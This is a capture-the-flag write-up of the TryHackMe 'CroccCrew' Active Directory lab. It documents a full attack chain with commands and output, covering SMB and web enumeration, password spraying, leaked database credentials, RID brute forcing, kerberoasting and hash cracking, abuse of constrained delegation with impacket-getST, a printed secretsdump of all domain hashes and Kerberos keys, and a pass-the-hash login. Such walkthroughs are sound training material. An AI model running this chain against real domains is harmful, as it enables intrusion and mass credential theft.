---
title: "CroccCrew TryHackMe" 
date: 2025-08-11 00:50:00 0000+
tags: [WriteUp, CroccCrew, THM,  Enumeration, Active Directory, SMB, Hash Cracking, RID Bruteforcing,Bloodhound, Rusthound-CE, Pywerview, Password Spraying, PTH, AllowedToDelegate, Lateral Movement, Privilege Escalation, Windows]
categories: [WriteUps, TryHackMe]
image:
  path: /assets/images/CroccCrew_THM/preview_crocccrew.png
---
# CroccCrew THM Writeup

CroccCrew is an insane difficulty Active directory machine which mainly focuses on enumeration to get our first flag and then a user is kerberoastable which has allowed to delegate privileges set to them and after finding the correct SPN for them we get the administrator service ticket to the DC giving us privileges to dump the domain, which also gives us the administrator creds leading us getting a shell and pwning this box.

![image.png](/assets/images/CroccCrew_THM/image.png)

## Initial Enumeration

As always we are gonna start off with the rustmap to find the open ports and services.

```bash
rustmap.py -ip 10.201.26.169
```

The results are as,

```bash
# Nmap 7.94SVN scan initiated Tue Aug 12 01:48:27 2025 as: nmap -sC -sV -v -p 53,80,88,135,139,389,445,464,593,636,3268,3269,3389,9389,49667,49668,49669,49671,49672,49710,49894 -oA nmap/crocc 10.201.26.169
Nmap scan report for 10.201.26.169
Host is up (0.24s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-11 20:18:46Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: COOCTUS.CORP0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: COOCTUS.CORP0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-08-11T20:20:18+00:00; +12s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: COOCTUS
|   NetBIOS_Domain_Name: COOCTUS
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: COOCTUS.CORP
|   DNS_Computer_Name: DC.COOCTUS.CORP
|   Product_Version: 10.0.17763
|_  System_Time: 2025-08-11T20:19:39+00:00
| ssl-cert: Subject: commonName=DC.COOCTUS.CORP
| Issuer: commonName=DC.COOCTUS.CORP
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-08-10T20:06:12
| Not valid after:  2026-02-09T20:06:12
| MD5:   b3d2:5a01:a3f7:2b46:deed:c999:56d6:6bee
|_SHA-1: 8547:b04b:46c6:bc27:9c28:585c:3cc1:3d44:8c32:9f4e
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49669/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49710/tcp open  msrpc         Microsoft Windows RPC
49894/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-08-11T20:19:42
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 11s, deviation: 0s, median: 10s

Read data files from: /usr/bin//share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Aug 12 01:50:13 2025 -- 1 IP address (1 host up) scanned in 106.71 seconds
```

Looking at the results we can say that we can say that its an Active Directory machine.

### DNS Enumeration

Port 53 is open on the box lets enumerate DNS records.

For the MS Records.

```bash
dig @dc.cooctus.corp cooctus.corp MS
```

![image.png](/assets/images/CroccCrew_THM/image%201.png)

Trying with the TXT records.

```bash
dig @dc.cooctus.corp cooctus.corp TXT
```

![image.png](/assets/images/CroccCrew_THM/image%202.png)

Nothing interesting found here.

### SMB Enumeration

Ports 139 and 445 are open so lets enumerate SMB.

Lets try with the null authentication.

```bash
nxc smb cooctus.corp -u '' -p ''
```

![image.png](/assets/images/CroccCrew_THM/image%203.png)

Lets enumerate shares using the null authentication.

```bash
nxc smb cooctus.corp -u '' -p '' --shares
```

![image.png](/assets/images/CroccCrew_THM/image%204.png)

Lets now try with the guest authentication.

```bash
nxc smb cooctus.corp -u '.' -p ''
```

![image.png](/assets/images/CroccCrew_THM/image%205.png)

We need some credentials to do that.

### Web Enumeration

Port 80 is open on the box, lets try to find something on the webpage, here we look for potential usernames and passwords fortunately.

Visiting the website lands us on this page.

![image.png](/assets/images/CroccCrew_THM/image%206.png)

We see some potential usernames on the main page of the website, so lets create a usernames.txt file adding these to it.

```text
SP00KY
CAKE
MILES
CRYILLIC
VARG
HORSHARK
DARKSTAR7471
ORIEL
NAMELESS0NE
SMACKHACK
FAWAZ
GREETZ
CROCC
CREW
CROCCCREW
```

I made the above potential usernames list.

Now lets do a quick user enumeration of the domain using kerbrute.

```bash
kerbrute userenum --dc 10.201.26.169 -d cooctus.corp usernames.txt
```

![image.png](/assets/images/CroccCrew_THM/image%207.png)

Found 3 valid ones, I will not change the usernames.txt as of now we keep that for later on as it may contain passwords too.

Lets edit our usernames.txt file and add the lowercase of the above usernames to it for potential password check.

Edited usernames.txt file containing all the same names but in lowercase too.

```text
SP00KY
CAKE
MILES
CRYILLIC
VARG
HORSHARK
DARKSTAR7471
ORIEL
NAMELESS0NE
SMACKHACK
FAWAZ
GREETZ
CROCC
CREW
CROCCCREW
sp00ky
cake
miles
cryillic
varg
horshark
darkstar7471
oriel
nameless0ne
smackhack
fawaz
greetz
crocc
crew
crocccrew
```

Now lets try with a password spray.

```bash
nxc smb cooctus.corp -u usernames.txt -p usernames.txt --no-bruteforce --continue-on-success
```

![image.png](/assets/images/CroccCrew_THM/image%208.png)

But it didn’t found anything useful.

Lets try to do directory busting using feroxbuster.

```bash
feroxbuster -u http://cooctus.corp/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt -t 100 -k -x php,html,aspx,txt
```

![image.png](/assets/images/CroccCrew_THM/image%209.png)

Found some interesting files.

Visiting the [http://cooctus.corp/robots.txt](http://cooctus.corp/robots.txt) we have these pages.

![image.png](/assets/images/CroccCrew_THM/image%2010.png)

Visiting backdoor.php we have this

![image.png](/assets/images/CroccCrew_THM/image%2011.png)

Tried several commands here but none were useful.

Visiting the /db-config.bak gives us this php code.

```php
<?php

$servername = "db.cooctus.corp";
$username = "C00ctusAdm1n";
$password = "B4dt0th3b0n3";

// Create connection $conn = new mysqli($servername, $username, $password);

// Check connection if ($conn->connect_error) {
die ("Connection Failed: " .$conn->connect_error);
}

echo "Connected Successfully";

?>
```

Okay so now we have a new username and a password, adding these two to our usernames.txt and passwords.txt files.

Lets try with the password spray once more.

```bash
nxc ldap cooctus.corp -u usernames.txt -p 'B4dt0th3b0n3' --continue-on-success
```

![image.png](/assets/images/CroccCrew_THM/image%2012.png)

But nothing worked out this time too!

Again looking at the scan results, we have a RDP port open on the box.

Lets try connecting to RDP with the above credentials obtained.

### RDP Enumeration

Connecting to RDP using rdesktop.

```bash
rdesktop -u:C00ctusAdm1n -d:cooctus.corp -f 10.201.26.169:3389
```

![image.png](/assets/images/CroccCrew_THM/image%2013.png)

We have a note in the background saying that Visitor/GuestLogin!

These look like guest access to the domain, adding them to my creds.txt file.

### LDAP Enumeration

Port 389 is open on the domain and we have some new credentials, lets try to authenticate with them.

```bash
nxc ldap cooctus.corp -u 'Visitor' -p 'GuestLogin!'
```

![image.png](/assets/images/CroccCrew_THM/image%2014.png)

We have validation.

### SMB Enumeration 2

We have valid creds across the domain, lets now enumerate some shares on the domain.

```bash
nxc smb cooctus.corp -u 'Visitor' -p 'GuestLogin!' --shares
```

![image.png](/assets/images/CroccCrew_THM/image%2015.png)

We have READ permissions on the HOME share.

Lets try to enumerate this using smbclient.

```bash
smbclient //cooctus.corp/Home -U 'Visitor'%'GuestLogin!'
```

![image.png](/assets/images/CroccCrew_THM/image%2016.png)

Downloading the user.txt file and submitting it.

Now lets do a RID Cycling attack and find all the machine and user accounts on the domain and overwrite our usernames.txt with it.

```bash
smbclient //cooctus.corp/Home -U 'Visitor'%'GuestLogin!' --rid-brute
```

The results are:

```text
SMB                      10.201.26.169   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:COOCTUS.CORP) (signing:True) (SMBv1:False)
SMB                      10.201.26.169   445    DC               [+] COOCTUS.CORP\Visitor:GuestLogin! 
SMB                      10.201.26.169   445    DC               498: COOCTUS\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB                      10.201.26.169   445    DC               500: COOCTUS\Administrator (SidTypeUser)
SMB                      10.201.26.169   445    DC               501: COOCTUS\Guest (SidTypeUser)
SMB                      10.201.26.169   445    DC               502: COOCTUS\krbtgt (SidTypeUser)
SMB                      10.201.26.169   445    DC               512: COOCTUS\Domain Admins (SidTypeGroup)
SMB                      10.201.26.169   445    DC               513: COOCTUS\Domain Users (SidTypeGroup)
SMB                      10.201.26.169   445    DC               514: COOCTUS\Domain Guests (SidTypeGroup)
SMB                      10.201.26.169   445    DC               515: COOCTUS\Domain Computers (SidTypeGroup)
SMB                      10.201.26.169   445    DC               516: COOCTUS\Domain Controllers (SidTypeGroup)
SMB                      10.201.26.169   445    DC               517: COOCTUS\Cert Publishers (SidTypeAlias)
SMB                      10.201.26.169   445    DC               518: COOCTUS\Schema Admins (SidTypeGroup)
SMB                      10.201.26.169   445    DC               519: COOCTUS\Enterprise Admins (SidTypeGroup)
SMB                      10.201.26.169   445    DC               520: COOCTUS\Group Policy Creator Owners (SidTypeGroup)
SMB                      10.201.26.169   445    DC               521: COOCTUS\Read-only Domain Controllers (SidTypeGroup)
SMB                      10.201.26.169   445    DC               522: COOCTUS\Cloneable Domain Controllers (SidTypeGroup)
SMB                      10.201.26.169   445    DC               525: COOCTUS\Protected Users (SidTypeGroup)
SMB                      10.201.26.169   445    DC               526: COOCTUS\Key Admins (SidTypeGroup)
SMB                      10.201.26.169   445    DC               527: COOCTUS\Enterprise Key Admins (SidTypeGroup)
SMB                      10.201.26.169   445    DC               553: COOCTUS\RAS and IAS Servers (SidTypeAlias)
SMB                      10.201.26.169   445    DC               571: COOCTUS\Allowed RODC Password Replication Group (SidTypeAlias)
SMB                      10.201.26.169   445    DC               572: COOCTUS\Denied RODC Password Replication Group (SidTypeAlias)
SMB                      10.201.26.169   445    DC               1000: COOCTUS\DC$ (SidTypeUser)
SMB                      10.201.26.169   445    DC               1101: COOCTUS\DnsAdmins (SidTypeAlias)
SMB                      10.201.26.169   445    DC               1102: COOCTUS\DnsUpdateProxy (SidTypeGroup)
SMB                      10.201.26.169   445    DC               1109: COOCTUS\Visitor (SidTypeUser)
SMB                      10.201.26.169   445    DC               1115: COOCTUS\mark (SidTypeUser)
SMB                      10.201.26.169   445    DC               1116: COOCTUS\Jeff (SidTypeUser)
SMB                      10.201.26.169   445    DC               1117: COOCTUS\Spooks (SidTypeUser)
SMB                      10.201.26.169   445    DC               1118: COOCTUS\RDP-Users (SidTypeGroup)
SMB                      10.201.26.169   445    DC               1119: COOCTUS\Steve (SidTypeUser)
SMB                      10.201.26.169   445    DC               1120: COOCTUS\Howard (SidTypeUser)
SMB                      10.201.26.169   445    DC               1121: COOCTUS\admCroccCrew (SidTypeUser)
SMB                      10.201.26.169   445    DC               1122: COOCTUS\Fawaz (SidTypeUser)
SMB                      10.201.26.169   445    DC               1123: COOCTUS\karen (SidTypeUser)
SMB                      10.201.26.169   445    DC               1124: COOCTUS\cryillic (SidTypeUser)
SMB                      10.201.26.169   445    DC               1125: COOCTUS\yumeko (SidTypeUser)
SMB                      10.201.26.169   445    DC               1126: COOCTUS\pars (SidTypeUser)
SMB                      10.201.26.169   445    DC               1127: COOCTUS\kevin (SidTypeUser)
SMB                      10.201.26.169   445    DC               1128: COOCTUS\jon (SidTypeUser)
SMB                      10.201.26.169   445    DC               1129: COOCTUS\Varg (SidTypeUser)
SMB                      10.201.26.169   445    DC               1130: COOCTUS\evan (SidTypeUser)
SMB                      10.201.26.169   445    DC               1131: COOCTUS\Ben (SidTypeUser)
SMB                      10.201.26.169   445    DC               1132: COOCTUS\David (SidTypeUser)
SMB                      10.201.26.169   445    DC               1134: COOCTUS\password-reset (SidTypeUser)
SMB                      10.201.26.169   445    DC               1135: COOCTUS\PC-Joiner (SidTypeGroup)
SMB                      10.201.26.169   445    DC               1136: COOCTUS\VPN Access (SidTypeGroup)
SMB                      10.201.26.169   445    DC               1137: COOCTUS\Server Users (SidTypeGroup)
SMB                      10.201.26.169   445    DC               1138: COOCTUS\Restrict DC Login (SidTypeGroup)
SMB                      10.201.26.169   445    DC               1139: COOCTUS\East Coast (SidTypeGroup)
SMB                      10.201.26.169   445    DC               1140: COOCTUS\West Coast (SidTypeGroup)
SMB                      10.201.26.169   445    DC               1141: COOCTUS\File Server Access (SidTypeGroup)
SMB                      10.201.26.169   445    DC               1142: COOCTUS\File Server Admins (SidTypeGroup)
SMB                      10.201.26.169   445    DC               1143: COOCTUS\MSSQL Admins (SidTypeGroup)
SMB                      10.201.26.169   445    DC               1144: COOCTUS\MSSQL Access (SidTypeGroup)

```

Carved out the usernames from this rid dump and created a new usernames.txt file

```text
Administrator
Guest
krbtgt
Visitor
mark
Jeff
Spooks
RDP-Users
Steve
Howard
admCroccCrew
Fawaz
karen
cryillic
yumeko
pars
kevin
jon
Varg
evan
Ben
David
password-reset
PC-Joiner
VPN Access
Server Users
Restrict DC Login
East Coast
West Coast
File Server Access
File Server Admins
MSSQL Admins
MSSQL Access
```

Now lets proceed with the bloodhound enumeration.

### Bloodhound

Since we have valid credentials to the domain, we can do a ldap domain data dump and analyze it.

Using rusthound-ce to collect the data.

```bash
rusthound-ce -d cooctus.corp -u 'Visitor' -p 'GuestLogin!' -f dc.cooctus.corp -c All -z
```

![image.png](/assets/images/CroccCrew_THM/image%2017.png)

Uploading the .zip created to the Bloodhound-CE.

## Exploitation

### Kerberoasting

Marking **Visitor** as owned in the domain.

![image.png](/assets/images/CroccCrew_THM/image%2018.png)

But we dont have any outbound object control with this user.

Now looking over to the premade cypher queries.

Looking towards the **Shortest paths to systems trusted for unconstrained delegation.**

![image.png](/assets/images/CroccCrew_THM/image%2019.png)

Looking at the **Password-Reset** user it has **Allowed to Delegate** on the DC.

Also when I ran **List all kerberoastable users,** we have this.

![image.png](/assets/images/CroccCrew_THM/image%2020.png)

So lets **kerberoast** it.

```bash
/opt/targetedKerberoast/targetedKerberoast.py -v -u 'Visitor' -p 'GuestLogin!' -d 'cooctus.corp' --dc-host dc.cooctus.corp
```

![image.png](/assets/images/CroccCrew_THM/image%2021.png)

Saving the hash to the hashes.txt file.

Let’s try to crack this hash using hashcat.

```bash
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
```

![image.png](/assets/images/CroccCrew_THM/image%2022.png)

We have the credentials, adding them to my creds.txt file, marking **Password-Reset** as owned.

### Shell as Administrator

Now that we have **Password-Reset** account credentials.

From bloodhound we have this path.

![image.png](/assets/images/CroccCrew_THM/image%2023.png)

**AllowedToDelegate** - Means that the **Password-Reset** user has a SPN set as HTTP/DC.COOCTUS.CORP, so we can impersonate as any user and request a service ticket for that user.

![image.png](/assets/images/CroccCrew_THM/image%2024.png)

Lets now exploit this **AllowedToDelegate** privilege.

```bash
impacket-getST -spn 'HTTP/DC.COOCTUS.CORP' -impersonate 'administrator' cooctus.corp/'password-reset':'resetpassword'
```

![image.png](/assets/images/CroccCrew_THM/image%2025.png)

It was failing due to some kerberos errors.

Now lets enumerate this **password-reset** user more for SPNs.

We are going to use the **Pywerview** a utility for linux to use powerview through linux.

```bash
/opt/pywerview/pywerview.py get-netuser -u 'password-reset' -p 'resetpassword' -t dc.cooctus.corp -d cooctus.corp --username 'password-reset'
```

![image.png](/assets/images/CroccCrew_THM/image%2026.png)

Here we have **msds-allowedtodelegateto** but bloodhound didn’t show this info to us and its set to **OAKLEY/DC.COOCTUS.CORP**

Now lets request a Service Ticket.

```bash
impacket-getST -spn 'oakley/DC.COOCTUS.CORP' -impersonate 'administrator' cooctus.corp/'password-reset':'resetpassword'
```

![image.png](/assets/images/CroccCrew_THM/image%2027.png)

Got the .ccache file for the administrator.

Exporting it to our linux kerberos environment variable.

```bash
export KRB5CCNAME=administrator.ccache
klist
```

![image.png](/assets/images/CroccCrew_THM/image%2028.png)

Now lets just do a domain dump using impacket’s secretsdump.py

```bash
impacket-secretsdump -k -no-pass DC.COOCTUS.CORP
```

The dump is as follows:

```text
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Target system bootKey: 0xe748a0def7614d3306bd536cdc51bebe
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7dfa0531d73101ca080c7379a9bff1c7:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
COOCTUS\DC$:plain_password_hex:5ec24808c2dd0b870e6a4a7451441946089bcca97238c0b1fef30c0b00ba18a7cf0978c4aefe892e1fb527c7e9e4530f83e7759e46c888cf71eeb849f748f3bf26835920f102ff373de2ff410fcea1beddb9992a3b97ebbf298aedf4f39688960ea51180758f36e3f22ed4ba00af54bb1c74617a21cf15d725c0ae6c02ce3800a5226bfd5da9dffe1ec52acf988204dcb221ba895cfcada6c9b687201658a30d8099624018280810928e5448924cc9b4612f6eec0bd3dc424ddd3303d602f45db1193bee9f06da865ec64918c8c718f83c1510cebb3cd97808c1f0c8ee29ac8e7ddf63c1a37184059e92104f3e45f024
COOCTUS\DC$:aad3b435b51404eeaad3b435b51404ee:54dcb3d4c79223400023ccd7ee195096:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xdadf91990ade51602422e8283bad7a4771ca859b
dpapi_userkey:0x95ca7d2a7ae7ce38f20f1b11c22a05e5e23b321b
[*] NL$KM 
 0000   D5 05 74 5F A7 08 35 EA  EC 25 41 2C 20 DC 36 0C   ..t_..5..%A, .6.
 0010   AC CE CB 12 8C 13 AC 43  58 9C F7 5C 88 E4 7A C3   .......CX..\..z.
 0020   98 F2 BB EC 5F CB 14 63  1D 43 8C 81 11 1E 51 EC   ...._..c.C....Q.
 0030   66 07 6D FB 19 C4 2C 0E  9A 07 30 2A 90 27 2C 6B   f.m...,...0*.',k
NL$KM:d505745fa70835eaec25412c20dc360caccecb128c13ac43589cf75c88e47ac398f2bbec5fcb14631d438c81111e51ec66076dfb19c42c0e9a07302a90272c6b
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:add41095f1fb0405b32f70a489de022d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d4609747ddec61b924977ab42538797e:::
COOCTUS.CORP\Visitor:1109:aad3b435b51404eeaad3b435b51404ee:872a35060824b0e61912cb2e9e97bbb1:::
COOCTUS.CORP\mark:1115:aad3b435b51404eeaad3b435b51404ee:0b5e04d90dcab62cc0658120848244ef:::
COOCTUS.CORP\Jeff:1116:aad3b435b51404eeaad3b435b51404ee:1004ed2b099a7c8eaecb42b3d73cc9b7:::
COOCTUS.CORP\Spooks:1117:aad3b435b51404eeaad3b435b51404ee:07148bf4dacd80f63ef09a0af64fbaf9:::
COOCTUS.CORP\Steve:1119:aad3b435b51404eeaad3b435b51404ee:2ae85453d7d606ec715ef2552e16e9b0:::
COOCTUS.CORP\Howard:1120:aad3b435b51404eeaad3b435b51404ee:65340e6e2e459eea55ae539f0ec9def4:::
COOCTUS.CORP\admCroccCrew:1121:aad3b435b51404eeaad3b435b51404ee:0e2522b2d7b9fd08190a7f4ece342d8a:::
COOCTUS.CORP\Fawaz:1122:aad3b435b51404eeaad3b435b51404ee:d342c532bc9e11fc975a1e7fbc31ed8c:::
COOCTUS.CORP\karen:1123:aad3b435b51404eeaad3b435b51404ee:e5810f3c99ae2abb2232ed8458a61309:::
COOCTUS.CORP\cryillic:1124:aad3b435b51404eeaad3b435b51404ee:2d20d252a479f485cdf5e171d93985bf:::
COOCTUS.CORP\yumeko:1125:aad3b435b51404eeaad3b435b51404ee:c0e0e39ac7cab8c57c3543c04c340b49:::
COOCTUS.CORP\pars:1126:aad3b435b51404eeaad3b435b51404ee:fad642fb63dcc57a24c71bdc47e55a05:::
COOCTUS.CORP\kevin:1127:aad3b435b51404eeaad3b435b51404ee:48de70d96bf7b6874ec195cd5d389a09:::
COOCTUS.CORP\jon:1128:aad3b435b51404eeaad3b435b51404ee:7f828aaed37d032d7305d6d5016ccbb3:::
COOCTUS.CORP\Varg:1129:aad3b435b51404eeaad3b435b51404ee:7da62b00d4b258a03708b3c189b41a7e:::
COOCTUS.CORP\evan:1130:aad3b435b51404eeaad3b435b51404ee:8c4b625853d78e84fb8b3c4bcd2328c5:::
COOCTUS.CORP\Ben:1131:aad3b435b51404eeaad3b435b51404ee:1ce6fec89649608d974d51a4d6066f12:::
COOCTUS.CORP\David:1132:aad3b435b51404eeaad3b435b51404ee:f863e27063f2ccfb71914b300f69186a:::
COOCTUS.CORP\password-reset:1134:aad3b435b51404eeaad3b435b51404ee:0fed9c9dc78da2c6f37f885ee115585c:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:54dcb3d4c79223400023ccd7ee195096:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:129d7f8a246f585fadc6fe095403b31b606a940f726af22d675986fc582580c4
Administrator:aes128-cts-hmac-sha1-96:2947439c5d02b9a7433358ffce3c4c11
Administrator:des-cbc-md5:5243234aef9d0e83
krbtgt:aes256-cts-hmac-sha1-96:25776b9622e67e69a5aee9cf532aa6ffec9318ba780e2f5c966c0519d5958f1e
krbtgt:aes128-cts-hmac-sha1-96:69988d411f292b02157b8fc1b539bd98
krbtgt:des-cbc-md5:d9eff2048f2f3e46
COOCTUS.CORP\Visitor:aes256-cts-hmac-sha1-96:e107d748348260a625b7635855f0f403731a06837f2875bec8e15b4be9e017c3
COOCTUS.CORP\Visitor:aes128-cts-hmac-sha1-96:d387522d6ce2698ddde8c0f5126eca90
COOCTUS.CORP\Visitor:des-cbc-md5:a8023e2c04e910fb
COOCTUS.CORP\mark:aes256-cts-hmac-sha1-96:ee0949690f31a22898f0808386aa276b2303f82a6b06da39b9735da1b5fc4c8d
COOCTUS.CORP\mark:aes128-cts-hmac-sha1-96:ce5df3dfb717b5649ef59e9d8d028c78
COOCTUS.CORP\mark:des-cbc-md5:83da7acd5b85c2f1
COOCTUS.CORP\Jeff:aes256-cts-hmac-sha1-96:c57c7d8f9011d0f11633ae83a2db2af53af09d47a9c27fc05e8a932686254ef0
COOCTUS.CORP\Jeff:aes128-cts-hmac-sha1-96:e95538a0752f71a2e615e88fbf3f9151
COOCTUS.CORP\Jeff:des-cbc-md5:4c318a40a792feb0
COOCTUS.CORP\Spooks:aes256-cts-hmac-sha1-96:c70088aaeae0b4fbaf129e3002b4e99536fa97404da96c027626dcfcd4509800
COOCTUS.CORP\Spooks:aes128-cts-hmac-sha1-96:7f95dc2d8423f0607851a27c46e3ba0d
COOCTUS.CORP\Spooks:des-cbc-md5:0231349bcd549b97
COOCTUS.CORP\Steve:aes256-cts-hmac-sha1-96:48edbdf191165403dca8103522bc953043f0cd2674f103069c1012dc069e6fd2
COOCTUS.CORP\Steve:aes128-cts-hmac-sha1-96:6f3a688e3d88d44c764253470cf95d0c
COOCTUS.CORP\Steve:des-cbc-md5:0d54b320cba7627a
COOCTUS.CORP\Howard:aes256-cts-hmac-sha1-96:6ea6db6a4d5042326f93037d4ec4284d6bbd4d79a6f9b07782aaf4257baa13f8
COOCTUS.CORP\Howard:aes128-cts-hmac-sha1-96:6926ab9f1a65d7380de82b2d29a55537
COOCTUS.CORP\Howard:des-cbc-md5:9275c8ba40a16b86
COOCTUS.CORP\admCroccCrew:aes256-cts-hmac-sha1-96:3fb5b3d1bdfc4aff33004420046c94652cba6b70fd9868ace49d073170ec7db1
COOCTUS.CORP\admCroccCrew:aes128-cts-hmac-sha1-96:19894057a5a47e1b6991c62009b8ded4
COOCTUS.CORP\admCroccCrew:des-cbc-md5:ada854ce919d2c75
COOCTUS.CORP\Fawaz:aes256-cts-hmac-sha1-96:4f2b258698908a6dbac21188a42429ac7d89f5c7e86dcf48df838b2579b262bc
COOCTUS.CORP\Fawaz:aes128-cts-hmac-sha1-96:05d26514fe5a64e76484e5cf84c420c1
COOCTUS.CORP\Fawaz:des-cbc-md5:a7d525e501ef1fbc
COOCTUS.CORP\karen:aes256-cts-hmac-sha1-96:dc423de7c5e44e8429203ca226efed450ed3d25d6d92141853d22fee85fddef0
COOCTUS.CORP\karen:aes128-cts-hmac-sha1-96:6e66c00109942e45588c448ddbdd005d
COOCTUS.CORP\karen:des-cbc-md5:a27cf23eaba4708a
COOCTUS.CORP\cryillic:aes256-cts-hmac-sha1-96:f48f9f9020cf318fff80220a15fea6eaf4a163892dd06fd5d4e0108887afdabc
COOCTUS.CORP\cryillic:aes128-cts-hmac-sha1-96:0b8dd6f24f87a420e71b4a649cd28a39
COOCTUS.CORP\cryillic:des-cbc-md5:6d92892ab9c74a31
COOCTUS.CORP\yumeko:aes256-cts-hmac-sha1-96:7c3bd36a50b8f0b880a1a756f8f2495c14355eb4ab196a337c977254d9dfd992
COOCTUS.CORP\yumeko:aes128-cts-hmac-sha1-96:0d33127da1aa3f71fba64525db4ffe7e
COOCTUS.CORP\yumeko:des-cbc-md5:8f404a1a97e0435e
COOCTUS.CORP\pars:aes256-cts-hmac-sha1-96:0c72d5f59bc70069b5e23ff0b9074caf6f147d365925646c33dd9e649349db86
COOCTUS.CORP\pars:aes128-cts-hmac-sha1-96:79314ceefa18e30a02627761bb8dfee9
COOCTUS.CORP\pars:des-cbc-md5:15d552643220868a
COOCTUS.CORP\kevin:aes256-cts-hmac-sha1-96:9982245b622b09c28c77adc34e563cd30cb00d159c39ecc7bc0f0a8857bcc065
COOCTUS.CORP\kevin:aes128-cts-hmac-sha1-96:51cc7562d3de39f345b68e6923725a6a
COOCTUS.CORP\kevin:des-cbc-md5:89201a58e33ed9ba
COOCTUS.CORP\jon:aes256-cts-hmac-sha1-96:9fa5e82157466b813a7b05c311a25fd776182a1c6c9e20d15330a291c3e961e5
COOCTUS.CORP\jon:aes128-cts-hmac-sha1-96:a6202c53070db2e3b5327cef1bb6be86
COOCTUS.CORP\jon:des-cbc-md5:0dabe370ab64f407
COOCTUS.CORP\Varg:aes256-cts-hmac-sha1-96:e85d21b0c9c41eb7650f4af9129e10a83144200c4ad73271a31d8cd2525bdf45
COOCTUS.CORP\Varg:aes128-cts-hmac-sha1-96:afd9fe7026c127d2b6e84715f3fcc879
COOCTUS.CORP\Varg:des-cbc-md5:8cb92637260eb5c4
COOCTUS.CORP\evan:aes256-cts-hmac-sha1-96:d8f0a955ae809ce3ac33b517e449a70e0ab2f34deac0598abc56b6d48347cdc3
COOCTUS.CORP\evan:aes128-cts-hmac-sha1-96:c67fc5dcd5a750fe0f22ad63ffe3698b
COOCTUS.CORP\evan:des-cbc-md5:c246c7f152d92949
COOCTUS.CORP\Ben:aes256-cts-hmac-sha1-96:1645867acea74aecc59ebf08d7e4d98a09488898bbf00f33dbc5dd2c8326c386
COOCTUS.CORP\Ben:aes128-cts-hmac-sha1-96:59774a99d18f215d34ea1f33a27bf1fe
COOCTUS.CORP\Ben:des-cbc-md5:801c51ea8546b55d
COOCTUS.CORP\David:aes256-cts-hmac-sha1-96:be42bf5c3aa5161f7cf3f8fce60613fc08cee0c487f5a681b1eeb910bf079c74
COOCTUS.CORP\David:aes128-cts-hmac-sha1-96:6b17ec1654837569252f31fec0263522
COOCTUS.CORP\David:des-cbc-md5:e5ba4f34cd5b6dae
COOCTUS.CORP\password-reset:aes256-cts-hmac-sha1-96:cdcbd00a27dcf5e46691aac9e51657f31d7995c258ec94057774d6e011f58ecb
COOCTUS.CORP\password-reset:aes128-cts-hmac-sha1-96:bb66b50c126becf82f691dfdb5891987
COOCTUS.CORP\password-reset:des-cbc-md5:343d2c5e01b5a74f
DC$:aes256-cts-hmac-sha1-96:f139b6126db52fc1e999964c9b5183f5e2226cf44db5445796fdba70ea00b7cb
DC$:aes128-cts-hmac-sha1-96:913f038cd869024f3ddc1df07e62515c
DC$:des-cbc-md5:da294358100868da
[*] Cleaning up... 

```

Now lets connect to the DC using evil-winrm, since port 5985 is open on the box.

```bash
evil-winrm -i cooctus.corp -u Administrator -H add41095f1fb0405b32f70a489de022d
```

![image.png](/assets/images/CroccCrew_THM/image%2029.png)

Found 2 flags easily as I was the administrator, the root.txt flag was not there in the administrator’s desktop.

So I searched for it using this command.

```powershell
Get-ChildItem -Path C:\ -Filter "root.txt" -Recurse -ErrorAction SilentlyContinue
```

